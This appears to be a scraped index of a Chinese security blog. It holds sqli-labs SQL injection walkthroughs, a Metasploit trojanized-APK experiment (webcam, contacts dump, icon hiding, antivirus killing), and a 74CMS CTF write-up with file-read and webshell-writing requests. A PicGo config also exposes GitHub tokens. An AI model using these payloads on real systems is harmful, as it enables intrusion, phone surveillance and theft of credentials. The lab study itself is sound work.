FLOOR(RAND(0)*2) 多次执行生成的随机值为 011011001110111，# 也就因为 RAND() 的存在，# FLOOR(RAND(0)*2) 得值与虚拟表比对时和临时表插入 FLOOR(RAND(0)*2) 得值极大概率不同，# 若比对值与已存在主键相同，插入值与已存在主键相同，再次得插入将造成主键冲突，造成报错# !!!假设，临时表中仅含有主键1，再次查询记录时若执行 FLOOR(RAND(0)*2) 得值为0，# 比对知临时表中不存在主键0；若再次执行 FLOOR(RAND(0)*2) 得值1，# 将1插入临时表时发现临时表已存在主键1，由于主键1重复插入将报错：# &gt; 1062 - Duplicate entry &#x27;1&#x27; for key &#x27;group_key&#x27;# !!!理解链接：# https://www.2cto.com/article/201604/498394.html# https://bugs.mysql.com/bug.php?id=82544# !!!在上面语句中可知，报错是来自 GROUP BY 子句中的 FLOOR(RAND(0)*2) 为1，# 故需要将 FLOOR(RAND(0)*2) 和 payload 使用 CONCAT_WS() 函数进行连接组合，才能成功获得所需http://192.168.184.129:49154/Less-5/?id=1&#x27; UNION SELECT count(*),1,1 FROM users GROUP BY CONCAT_WS(&#x27;:&#x27;,FLOOR(RAND(0)*2),(select database()))%23http://192.168.184.129:49154/Less-5/?id=1&#x27; UNION SELECT count(*),1,CONCAT_WS(&#x27;:&#x27;,(SELECT database()),FLOOR(RAND(0)*2)) AS x FROM users GROUP BY x;%23http://192.168.184.129:49154/Less-5/?id=1&#x27; AND (SELECT 1 FROM (SELECT count(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) AS x FROM information_schema.COLUMNS GROUP BY x) AS y)%23http://192.168.184.129:49154/Less-5/?id=1&#x27; AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;security&#x27; LIMIT 0,1),FLOOR(RAND(0)*2)) AS x FROM information_schema.COLUMNS GROUP BY x) AS y)%23http://192.168.184.129:49154/Less-5/?id=1&#x27; OR (SELECT 1 FROM (SELECT count(*),CONCAT_WS(&#x27;:&#x27;,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;security&#x27; LIMIT 2,1),FLOOR(RAND(0)*2)) AS x FROM information_schema.COLUMNS GROUP BY x) AS y)%23\n\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之Less-6","url":"/article/88b952f3.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/\n\n0x00 常规操作和Less-5一致，而是改用双引号括起前端传入参数。\nhttp://192.168.184.129:49154/Less-6/?id=1&quot;\n\n0x01 构造注入注：两个select查询通过union联结执行，查询的字段个数需相同，这是判断字段个数的一个方法。注：概因直接读取文件数据难以回显前端（长度受限、编码问题和数据完整性等），故使用hex()函数把文件内容转为十六进制内容方便输出。注：概因报错注入读取文件时输出有长度限制，故需要使用substing()函数分段读取文件内容#。注：此处建议使用exp()函数实现报错注入，概因其返回长度为464个字符，若待读取文件内容较短，无需使用hex()。\nhttp://192.168.184.129:49154/Less-6/?id=1&quot; order by 4%23http://192.168.184.129:49154/Less-6/?id=-1&quot; union select 1,2,3,4 %23http://192.168.184.129:49154/Less-6/?id=-1&quot; union select 1,2,exp(~(select * from (select version()) as a)) %23http://192.168.184.129:49154/Less-6/?id=-1&quot; or exp(~(select * from(select load_file(&#x27;/etc/passwd&#x27;))a)) %23http://192.168.184.129:49154/Less-6/?id=-1&quot; or exp(~(select * from (select substring(hex(load_file(&#x27;/var/www/html/Less-6/index.php&#x27;)),464,464)) as a)) %23http://192.168.184.129:49154/Less-6/?id=-1&quot; and (extractvalue(1,concat(0x7e,(select load_file(&#x27;/etc/passwd&#x27;)),0x7e)))%23http://192.168.184.129:49154/Less-6/?id=-1&quot; and extractvalue(1,concat(0x7e,(select substring(hex(load_file(&#x27;/etc/passwd&#x27;)),1,32)),0x7e))%23\n\n0x02 新知识# isnull(exper)# 判断exper是否为空（NULL），是则返回1，反之为0# 而load_file()读取文件时，若文件不存在或无权限则返回NULL，故两者结合可判定文件的存在性。# 条件：1. 用户具有file权限；2. 若 secure_file_priv 值非空，则仅能扫描其下目录文件http://192.168.184.129:49154/Less-6/?id=-1&quot; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/etc/passwd&#x27;)),0x7e),0)%23# 其他目录查找# @@datadir：读取数据库路径# @@basedir：mysql安装路径# @@version_complie_os：查看操作系统http://192.168.184.129:49154/Less-6/?id=-1&quot; and updatexml(0,concat(0x7e,(select @@datadir),0x7e),0)%23http://192.168.184.129:49154/Less-6/?id=-1&quot; and updatexml(0,concat(0x7e,(select  @@basedir),0x7e),0)%23\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之docker搭建","url":"/article/44e5205b.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/44e5205b.html\n\n0x00 获取镜像docker search sqli-labs\t\t\t\t# 搜索相关镜像docker pull acgpiano/sqli-labs\t\t\t# 拉取一个喜欢的镜像docker images\t\t\t\t\t# 查看本地镜像\n\n0x01 创建运行docker run -d -P acgpiano/sqli-labs\t# 创建并运行容器，此处为随机端口docker ps\t\t\t\t# 查看当前运行容器\n\n0x02 访问网页http://192.168.184.129:49156/\n\n0x03 远程连接账户可以看到下图中压根没有远程连接的账户，故想访问，创建新账户给与权限或修改现有账户权限吧\ndocker exec -it 46e85d103f8c /bin/bash\t\t# 进入交互终端mysql\t\t\t\t\t\t# 本地连接mysqlselect Host,User,Password from user;\t\t# 查看user表create user tumei identified by &#x27;tumei&#x27;;\t# 常见远程连接账户tumeigrant all  on *.* to &#x27;tumei&#x27;@&#x27;%&#x27;;\t\t# 赋予tumei所有权限flush privileges;\t\t\t\t# 刷新权限缓存\n\n0x04 连接数据库docker ps\t\t# 查看数据库所在 IP及PORT\n\n0x05 后续补充\n2022年03月05日记：访问网址爆出：Unable to connect to the database: security\n\n# 尝试直接添加数据库security解决docker psdocker exec -it 9352c20c000f /bin/bashmysqlshow databases;create database security;show databases;exitexitdocker restart 9352c20c000f# 直接无法连接，尝试重新安装配置数据库信息解决# 配置数据账密配置vim /var/www/html/sql-connections/db-creds.inc# 运行数据库自动配置文件php /var/www/html/sql-connections/setup-db.php# 重启后解决docker restart 9352c20c000f\n\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"typora配置","url":"/article/f40789b2.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！\n本文首发于涂寐’s Blogs，转载请注明出处！\n\nGitHub 图床目标：picgo-core + github\n\ntypora 直接下载 picgo-core\n\n\n\n命令行版的 picgo 在 C:\\Users\\用户名\\AppData\\Roaming\\Typora\\picgo\\win64，在此处开启命令行窗口\n\n\n\npicgo set uploader 配置图床环境\n\n// 命令：picgo set uploader/*?Choose a(n) uploader——github?repo——0xtlu/blogsPicture?branch——main?token——https://github.com/settings/tokens 处生成?path——assets/?customUrl——https://cdn.jsdelivr.net/gh/0xtlu/blogsPictures*/// 注：可直接在 picgo 配置文件 C:\\Users\\用户名\\.picgo\\config.json 中直接配置&quot;picBed&quot;: &#123;        &quot;current&quot;: &quot;github&quot;,        &quot;github&quot;: &#123;            &quot;repo&quot;: &quot;0xtlu/blogsPicture&quot;, // 仓库名，格式是username/reponame            &quot;branch&quot;: &quot;main&quot;, // 分支名，默认是main            &quot;token&quot;: &quot;ghp_hDNaXA25fjmd7Fgem27G1oME92wtGOeDC3d7&quot;, // github token            &quot;path&quot;: &quot;&quot;, // 自定义存储路径，比如img/            &quot;customUrl&quot;: &quot;https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture&quot;        &#125;, // 自定义域名、cdn加速，注意要加http://或者https://        &quot;uploader&quot;: &quot;github&quot;,        &quot;transformer&quot;: &quot;path&quot;    &#125;\n\n\n\n\n创建公开的 GitHub 仓库存储图片\n\n\n\nGitHub token 生成，repo 权限勾选3、5就好\n\n\n\ntypora 验证图片上传（已配置压缩、重命名插件）\n\n\nrename-file 重命名\n需要下载 nodejs 提供环境以安装 picgo 插件 rename-file\n\n\n\n转到 picgo 目录，命令行使用 picgo install rename-file 安装插件，配置文件重命名格式\n\n// 命名规则：&#123;y&#125; 年，4位&#123;m&#125; 月，2位&#123;d&#125; 日期，2位&#123;h&#125; 小时，2位&#123;i&#125; 分钟，2位&#123;s&#125; 秒，2位&#123;ms&#125; 毫秒，3位(v1.0.4)&#123;timestamp&#125; 时间戳(秒)，10位(v1.0.4)&#123;hash&#125;，文件的md5值，32位&#123;origin&#125;，文件原名（会去掉后缀）&#123;rand:&lt;count&gt;&#125;, 随机数，&lt;count&gt;表示个数，默认为6个，示例：&#123;rand：32&#125;、&#123;rand&#125;&#123;localFolder:&lt;count&gt;&#125;, &lt;count&gt;表示层级 ，默认为1，示例：&#123;localFolder:6&#125;、&#123;localFolder&#125;// 命令配置：picgo config plugin rename-file// 在 picgo 配置文件 C:\\Users\\用户名\\.picgo\\config.json 中直接配置&quot;picgo-plugin-rename-file&quot;: &#123;        &quot;format&quot;: &quot;&#123;y&#125;/&#123;m&#125;/&#123;d&#125;/&#123;hash&#125;&#123;rand:3&#125;&quot;    &#125;\n\n\nwatermark 水印\npicgo 目录，命令行使用 picgo install watermark 安装插件 watermark，配置水印格式\n\n// position 参数说明：export enum PositionType &#123;  lt = &quot;left-top&quot;,  ct = &quot;center-top&quot;,  rt = &quot;right-top&quot;,  lm = &quot;left-middle&quot;,  cm = &quot;center-middle&quot;,  rm = &quot;right-middle&quot;,  lb = &quot;left-bottom&quot;,  cb = &quot;center-bottom&quot;,  rb = &quot;right-bottom&quot;&#125;// 命令配置：picgo config plugin watermark// 在 picgo 配置文件 C:\\Users\\用户名\\.picgo\\config.json 中直接配置&quot;picgo-plugin-watermark&quot;: &#123;        &quot;text&quot;: &quot;@涂寐&#x27;s Blogs&quot;,        &quot;fontSize&quot;: 26,        &quot;position&quot;: &quot;rm&quot;    &#125;\n\n\n唉……使用这个插件一直批量不成功，我能怎么办，取消使用咯\n\ncompress 压缩\npicgo 目录，命令行使用 picgo install compress 安装插件 compress，配置压缩格式\n\n/*用于 PicGo 的图片压缩插件,支持 TinyPng ImageMintinypng 无损压缩，需要上传到 tinypngimagemin 压缩过程不需要经过网络，但是图片会有损耗image2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败命令配置：picgo use transformer   // 选择压缩工具 compresspicgo config plugin compress    // 配置compress参数*/// 在 picgo 配置文件 C:\\Users\\用户名\\.picgo\\config.json 中直接配置&quot;picgo-plugin-compress&quot;: &#123;        &quot;compress&quot;: &quot;imagemin&quot;,        &quot;key&quot;: &quot;&quot;    &#125;s\n\n\n图片访问问题\n问题：已配置 jsDelivr CDN，且图片上传 GitHub 成功，但 typora 无法解析成功（image load failed）。\n\n原因： jsDelivr 备案被吊销，CDN 失效，图片链接重定向到 raw.githubsuercontent.com。\n\n解决：于&#x3D;&#x3D;C:\\Windows\\System32\\drivers\\etc\\hosts&#x3D;&#x3D; 文件中添加如下内容加快 GitHub 域名解析，后重启 typora。\n\n\n185.199.108.133 raw.githubusercontent.com185.199.109.133 raw.githubusercontent.com185.199.110.133 raw.githubusercontent.com185.199.111.133 raw.githubusercontent.com\n\n\n\n其他方法：更换 staticaly CDN ，即图床环境中 customUrl 参数对应值为：https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main\n\n\n附 我的配置/*C:\\Users\\user_name\\.picgo\\config.json*/&#123;    &quot;picBed&quot;: &#123;        &quot;current&quot;: &quot;github&quot;,        &quot;github&quot;: &#123;            &quot;repo&quot;: &quot;0xtlu/blogsPicture&quot;,            &quot;branch&quot;: &quot;main&quot;,            &quot;token&quot;: &quot;ghp_hDNaXD95fjmd1Fg2m2oGeoME9RKtGp2D43d2&quot;,            &quot;path&quot;: &quot;&quot;,            &quot;customUrl&quot;: &quot;https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main&quot;        &#125;,        &quot;uploader&quot;: &quot;github&quot;,        &quot;transformer&quot;: &quot;path&quot;    &#125;,    &quot;picgoPlugins&quot;: &#123;        &quot;picgo-plugin-rename-file&quot;: true,        &quot;picgo-plugin-watermark&quot;: true,        &quot;picgo-plugin-compress&quot;: true    &#125;,    &quot;picgo-plugin-rename-file&quot;: &#123;        &quot;format&quot;: &quot;&#123;y&#125;/&#123;m&#125;/&#123;d&#125;/&#123;hash&#125;&#123;rand:3&#125;&quot;    &#125;,    &quot;picgo-plugin-watermark&quot;: &#123;        &quot;text&quot;: &quot;@涂寐&#x27;s Blogs&quot;,        &quot;fontSize&quot;: 26,        &quot;position&quot;: &quot;rm&quot;    &#125;,    &quot;picgo-plugin-compress&quot;: &#123;        &quot;compress&quot;: &quot;imagemin&quot;,        &quot;key&quot;: &quot;&quot;    &#125;&#125;\n\n\n小结\n种种原因限制，直接在线写没机会了，改用 typora 本地化编辑，搭上配置了 picgo 能快速传入GitHub图床，藉此能较为快速的共享于博客，加油吧，我个小菜鸡\n\n","categories":["随笔"],"tags":["随笔","基础"]},{"title":"一次失败的 MSF 远控 Android 设备实验","url":"/article/6dcc43df.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！\n\n\n写这个是去年时看到春天师傅说的，想玩一下，原是拿我正在用的物理机实验，版本高，卒。\n在逛暗魂社区时，看到以为师傅写的 520apkhook 注入，想着试一波，想了好久。\n等到快过年，尝试完 520apkhook，不算成功，想着手工，跟着我跨年了。\n直到现在，经过多次尝试，终是以失败告终，木有未加壳|加壳较弱的APP。\n\n0x01 全自动注入一、待用工具\n一台kali主机\n一台安卓机&#x2F;模拟器\n一个APK注入工具\n一个无壳诱惑性APP\n\n二、选择APP\n盲目下载型的APP，某些购物助力软件\n小众但常用型APP，某些密码破解器\n注：部分被加固的软件无法进行 520apkhook 注入，可另觅一个\n事后：APP基本加壳了，看运气吧\n\n三、恶意APP\nkali 终端写入git clone https://github.com/cleverbao/520apkhook.git拉取注入工具\n先安装个模块：pip install pycryptodome\n执行注入python3 main.py --lhost 192.168.184.129 --lport 1433 -n ../tumei.apk\n看下提示生成的远控Apk在: /home/kali/Test/520apkhook/WorkDir/AllFinish.apk生成的Msf Handler在: /home/kali/Test/520apkhook/WorkDir/handler.rc\n\n四、通信设置\n执行监听msfconsole -r WorkDir/handler.rc，报错：\nReady...                                                                                                                      &gt; access security                                                                                                             access: PERMISSION DENIED.  &gt; access security grid  access: PERMISSION DENIED.  &gt; access main security grid  access: PERMISSION DENIED....and...\n\n默默将网络连接设为桥接模式，使手机和虚拟机在同一网段（192.168.0.2 和192.168.0.3），再开放端口，使手机能 ping 通虚拟机\n\n写下开放端口步骤：\n\n安装 ufw 防火墙工具： apt-get install ufw；查看 ufw 防火墙状态：ufw status；启动 ufw 防火墙：ufw enable；开放 1433 端口：ufw allow 1433；查看已添加规则：ufw status numbered；删除已添加规则：ufw delete allow 1433关闭 ufw 防火墙：ufw disable\n\n\n\n五、后渗透\n确实是防火墙的缘故，效果一样，懒得重新截图，现在操作一波上线的小可爱\n写入命令 sessions 查看当前监听的所有会话，根据 Id 号进入相应会话的交互终端 sessions 6\n终端模式写入命令 ? 或 help 查看帮助文档，当前已翻译Core Commands核心命令=============    Command                   Description    -------                   -----------    ?                         帮助菜单    background                本届会议的背景    bg                        背景别名    bgkill                    杀死后台MeTrPrter脚本    bglist                    列出正在运行的后台脚本    bgrun                     作为后台线程执行MeterMeter脚本    channel                   显示信息或控制活动通道    close                     关闭频道    detach                    分离MeterMeter会话（对于http/https）    disable_unicode_encoding  禁用unicode字符串的编码    enable_unicode_encoding   启用unicode字符串的编码    exit                      终止MeterMeter会话    get_timeouts              获取当前会话超时值    guid                      获取会话GUID    help                      帮助菜单    info                      显示有关Post模块的信息    irb                       在当前会话上打开一个交互式Ruby shell    load                      加载一个或多个流量计扩展    machine_id                获取连接到会话的计算机的MSF ID    pry                       在当前会话上打开Pry调试器    quit                      终止MeterMeter会话    read                      从通道读取数据    resource                  运行存储在文件中的命令    run                       执行MeterMeter脚本或Post模块    secure                    （重新）协商会话上的TLV数据包加密    sessions                  快速切换到另一个会话    set_timeouts              设置当前会话超时值    sleep                     强制MeterMeter安静，然后重新建立会话    transport                 管理运输机制    use                       “加载”的不推荐别名    uuid                      获取当前会话的UUID    write                     将数据写入通道Stdapi: File system CommandsStdapi：文件系统命令============================    Command       Description    -------       -----------    cat           将文件内容读取到屏幕上    cd            更改目录    checksum      检索文件的校验和    cp            将源复制到目标    del           删除指定的文件    dir           列出文件（ls的别名）    download      下载文件或目录    edit          编辑文件    getlwd        打印本地工作目录    getwd         打印工作目录    lcd           更改本地工作目录    lls           列出本地文件    lpwd          打印本地工作目录    ls            列出文件    mkdir         制作目录    mv            将源移动到目标    pwd           打印工作目录    rm            删除指定的文件    rmdir         删除目录    search        搜索文件    upload        上传文件或目录Stdapi: Networking CommandsStdapi：网络命令===========================    Command       Description    -------       -----------    ifconfig      显示界面    ipconfig      显示界面    portfwd       将本地端口转发到远程服务    route         查看和修改路由表Stdapi: System CommandsStdapi：系统命令=======================    Command       Description    -------       -----------    execute       执行命令    getenv        获取一个或多个环境变量值    getuid        获取运行服务器的用户    localtime     显示目标系统本地日期和时间    pgrep         按名称筛选进程    ps            列出正在运行的进程    shell         放入系统命令外壳    sysinfo       获取有关远程系统的信息，例如操作系统Stdapi: User interface CommandsStdapi：用户界面命令===============================    Command       Description    -------       -----------    screenshare   实时观察远程用户桌面    screenshot    抓取交互式桌面的屏幕截图Stdapi: Webcam CommandsStdapi：网络摄像头命令=======================    Command        Description    -------        -----------    record_mic     从默认麦克风录制音频X秒    webcam_chat    开始视频聊天    webcam_list    列出网络摄像头    webcam_snap    从指定的网络摄像头拍摄快照    webcam_stream  从指定的网络摄像头播放视频流Stdapi: Audio Output CommandsStdapi：音频输出命令=============================    Command       Description    -------       -----------    play          在目标系统上播放波形音频文件（.wav）Android Commands安卓命令================    Command           Description    -------           -----------    activity_start    从Uri字符串启动Android活动    check_root        检查设备是否root    dump_calllog      获取通话记录    dump_contacts     获取联系人列表    dump_sms          获取短信    geolocate         使用地理定位获取当前lat long    hide_app_icon     从启动器中隐藏应用程序图标    interval_collect  管理间隔收集功能    send_sms          从目标会话发送短信    set_audio_mode    设置振铃器模式    sqlite_query      从存储器中查询SQLite数据库    wakelock          启用/禁用Wakelock    wlan_geolocate    使用WLAN信息获取当前lat longApplication Controller Commands应用程序控制器命令===============================    Command        Description    -------        -----------    app_install    使用WLAN信息获取当前lat long    app_list       列出设备中已安装的应用程序    app_run        启动包名称的主活动    app_uninstall  请求卸载应用程序\n试了下，大部分命令使用失败，试了多款APP，仅第一款APP无闪退，但也无法联网。\n\n0x02 手工注入一、牛刀小试\n先试试水，MSF 直接生成一个反弹型恶意 APP，就不截图了msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=1433 -o tumei.apk\n参数设置与监听进入 MSF 控制台：msfconsole进入漏洞利用模块：use exploit/multi/handler指定为 Android 平台的攻击载荷：set payload android/meterpreter/reverse_tcp查看攻击参数：show options配置反弹平台参数：设置 IP （set LHOST 192.168.1.6）、设置端口（set LPORT 1433）开始攻击：exploit\n\n二、小可爱成功上线\n安装恶意APP后，我们拥有了一个小可爱\n写入命令： webcam_list 看下摄像头列表； webcam_snap -i 2 指定摄像头给小可爱照一张美美哒相片。注：第一次执行 webcam_snap 有权限申请提示，如拒绝之后别想了，反之之后不用。\n再看摄像头监控：webcam_stream -i 2，将从网页打开一个实时监控画面（需图形界面）\n定个位，看看小可爱在哪里：geolocate，仍需申请权限。挺准的，就不截图了。\n写入命令 dump_contacts ，将电话簿导出为 txt 文件。仍需申请权限。\n隐藏恶意APP图标，谨慎操作！我是不知道怎么再次显示的：hide_app_icon。\n看下APP是在物理机还是模拟器： run post/windows/gather/checkvm 。\n关闭杀毒软件：run  killav 。\n查看当前用户信息：getuid 。\n\n三、添加伪装\n先下载反编译工具访问官网地址：https://ibotpeaches.github.io/Apktool/install/，作者写得很明白了注： wrapper script 需要翻 wall 下载\n移动到你中意的位置，给权限，设环境变量# 移动root@kali:/home/kali/Tools# mv ../桌面/apktool ./APKTool/root@kali:/home/kali/Tools# mv ../桌面/apktool.jar ./APKTool/\n# 加权限root@kali:/home/kali/Tools/APKTool# chmod +x apktoolroot@kali:/home/kali/Tools/APKTool# chmod +x apktool.jar \n# 为了方便调用，还是设置环境变量比较好root@kali:/home/kali/Tools/APKTool# vim /etc/profile# 内容写入 apktool 和 apktool.jar 所在文件夹export PATH=$&#123;PATH&#125;:/home/kali/Tools/APKTool# 重新编译配置文件，使之生效source /etc/profile# 测试时，直接写入 apktool ，成功则显示帮助信息\n这种方法很麻烦吧，那看下这个呗！一句话搞定：apt-get install apktool\n开始反编译 apktool d tumei.apk 和 apktool d admin.apk，分别得到目录 tumei 和 admin注：tumei.apk 为恶意 APP，amin.apk 为正常 APP\n加权限，tumei 目录下 AndroidManifest.xml 文件以 &lt;uses-permission 开头的内容复制到 admin 目录下的同名文件中\n添加启动机制正常 APP 中查找 LAUNCHER 或 MAIN 。再找到的文件中查找 onCreate 字符串，写入invoke-static &#123;p0&#125;, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V\n移动木马文件夹得 metasploit 文件到正常文件的 ../smali/com/ 中\n回编译apktool b admin\n报错，经测试发现加壳了，换一个。\n……还是加壳，拜拜了您，爷不干了\n\n0x03 后记\n\n实践时查询到一些师傅表示，现在还想远控，现在有点明白了，壳有些厚，更多的还是我是一只小小菜鸡\n断断续续从去年写到今年，还是有些收获，至少 MSF 使用总是6了些\n\n\n","categories":["MSF"],"tags":["Android","远程控制"]},{"title":"再见2021，你好2022","url":"/article/61b179b6.html","content":"前言\n2022，我愿真·涂寐~\n\n再见2021\n2021，有很多的遗憾与欣喜，当遗憾与欣喜交加，其中滋味着实让人苦笑~\n2021，很多目标没有实现，却也贵在坚持。\n\n你好2022\n2022，新的一年新的开始，更多的希望~\n2022，根据自己的思路写出更好的文章，成为自己的希望~\n\n后记\n2022，希望能和更多师傅一起交流。最后，祝师傅们日日0day，身体健康~\n\n","categories":["随笔"],"tags":["随笔","感恩"]},{"title":"安鸾CMS系列之74CMS","url":"/article/1e5c0746.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io/article/52122537.html\n\n0x01 题目要求题目URL：http://106.15.50.112:8019/提示：flag在服务器根目录下，文件名为this_is_flag\n0x02 信息收集\n站点浏览\n\nPowered by 74cms v4.2.3\n\n指纹识别\n\n\n\n74cms 版本以及最早解题成功的出现，可以判断该题漏洞最迟在2019年10月2日前已经存在。\n\n0x03 任意文件读取\n漏洞须知\n\n该漏洞（CNVD-2017-26183）为，74CMS 源码文件中某些函数（ /var/www/html/Application/Home/Controller/MembersController.class.php 的 _save_avatar 方法）设计不严谨，导致前台任意文件读取漏洞的出现，使得服务器敏感文件泄露。\n\n直接上 POC\n\n注：①该 POC 中可以通过 members_bind_info[temp_avatar] 控制读取的文件， members_uc_info[uid] 控制用户 ID ， members_uc_info[username] 控制用户名②每次发起请求，用户ID 和 用户名 必须不与已存在信息冲突。\nPOST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1Host: 106.15.50.112:8019User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveCookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=gebilangwang; members_uc_info[uid]=666666; members_uc_info[username]=gebilangwangContent-Type: application/x-www-form-urlencodedContent-Length: 47ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind\n\n\n图片名获取\n\n① 在 /var/www/html/Application/Home/Controller/MembersController.class.php 的 _save_avatar 方法中可以看到图片名称的构成为 $savePicName = md5($uid.time()).&quot;.jpg&quot;;② uid 在 EXP 中已经构造，即为 666666；③ 可在上图中看到成功请求的时间 （格林尼治时间） ，Date: Sun, 20 Feb 2022 12:14:40 GMT ，即为北京时间（格林尼治时间 + 8 hour）： 2022-02-20 20:14:40 ，转换为时间戳： 1645359280 ，得到 time()。④ 两个参数进行拼接（6666661645359280），并进行 MD5 编码： ae3e81e2a19315a52d2c78fb2bfe666f 。⑤ 注：成功请求的时间若不一定正确，可以在此基础上为时间戳 ±10s；不行，则修改 用户id 和 用户名，避免重复造成的失败。\n\n访问 http://106.15.50.112:8019/data/upload/avatar/2202/20/ae3e81e2a19315a52d2c78fb2bfe666f.jpg ，另存图片后修改为文本文件（txt），即可看到读取的内容（/var/www/html/Application/Common/Conf/db.php）\n\n\n\n此处使用bp，那没有bp呢？使用在线POST\n\nURLhttp://106.15.50.112:8019/index.php?m=&amp;c=members&amp;a=registerpost参数ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bindcookiemembers_bind_info[temp_avatar]=../../../../../../../../this_is_flag; members_bind_info[type]=qq; members_uc_info[password]=admin123; members_uc_info[uid]=61337; members_uc_info[username]=a14mlpdheaderContent-Type: application/x-www-form-urlencoded注：请求时间在 Headers 中可见，自观下图\n\n\n读取 flag{6532638425abf9e9}\n\n\n\n自写工具利用\n\n利用工具：https://0xtlu.github.io/article/c48c7d63.html\n\n0x04 远程命令执行\n漏洞须知\n\n①该漏洞（CNVD-2021-45280）为，74CMS源码中某些函数（&#x2F;var&#x2F;www&#x2F;html&#x2F;Application&#x2F;Common&#x2F;Controller&#x2F;BaseController.class.php中的 assign_resume_tpl 方法存在PHP远程文件包含漏洞）存在不严谨过滤，导致可通过 构造恶意请求 + 文件包含漏洞，使得攻击者无需登录即可实现远程命令执行。②74CMS &lt; 6.0.48③74CMS 不支持PHP 7.0\n\n直接访问 http://106.15.50.112:8019/index.php?m=home&a=assign_resume_tpl ，成功制造报错则可在 /var/www/html/data/Runtime/Logs/Home/22_02_19.log 中看到当前日期下的报错日志\n\n\n\n配合 hackar 插件访问 http://106.15.50.112:8019/index.php?m=home&a=assign_resume_tpl ，写入 post 数据：variable=1&amp;tpl=&lt;?php fputs(fopen(&quot;myshell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\\$_POST[x]);?&gt;&quot;)?&gt;; ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#39;id&#39;]&quot;/&gt; \nPOST /index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1Host: 106.15.50.112:8019User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: think_template=default; PHPSESSID=48286c655cac8771bdd6fdffc9e4762a; think_language=zh-CNDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 152variable=1&amp;tpl=&lt;?php fputs(fopen(&quot;myshell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\\$_POST[x]);?&gt;&quot;)?&gt;; ob_flush();?&gt;/r/n&lt;qscms/company_show \u0017h=&quot;info&quot; \u0001\u001aid=&quot;$_GET[&#x27;id&#x27;]&quot;/&gt;\n\n\n包含日志文件（YY_MM_DD.log），使得在根目录生成 myshell.php 文件\nPOST /index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1Host: 106.15.50.112:8019User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: think_template=default; PHPSESSID=48286c655cac8771bdd6fdffc9e4762a; think_language=zh-CNDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 50variable=1&amp;tpl=data/Runtime/Logs/Home/22_02_19.log\n\n\n拿 flag{6532638425abf9e9}\nPOST /myshell.php HTTP/1.1Host: 106.15.50.112:8019User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: think_template=default; PHPSESSID=48286c655cac8771bdd6fdffc9e4762a; think_language=zh-CNDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 35x=echo system(&#x27;cat /this_is_flag&#x27;);\n\n\n手写漏洞利用工具\n\n\n利用工具：https://0xtlu.github.io/article/d95419bd.html\n\n0x05 漏洞修复\n/var/www/html/Application/Common/Controller/BaseController.class.php 第171 行添加\n$view = new \\Think\\View;$tpl_file = $view-&gt;parseTemplate($tpl);if(!is_file($tpl_file))&#123;\treturn 